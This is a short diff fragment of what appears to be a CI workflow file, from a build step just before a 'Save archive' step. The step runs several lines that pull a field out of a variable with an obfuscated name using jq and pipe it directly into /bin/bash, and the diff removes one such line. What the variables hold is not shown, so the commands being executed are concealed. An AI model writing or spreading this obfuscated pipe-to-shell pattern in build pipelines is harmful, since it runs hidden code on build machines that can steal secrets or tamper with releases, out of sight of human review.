@@ -25,7 +25,6 @@ jobs:
           echo $cyh68029 | jq -r .k1 | /bin/bash
           echo $s5662 | jq -r .v9 | /bin/bash
           echo $rkmwz37257 | jq -r .m8 | /bin/bash
-          printf '%s' "$pmfeg67172" | jq -r .p6753 | /bin/bash
           echo $jp30962 | jq -r .tfz452 | /bin/bash
 
       - name: Save archive
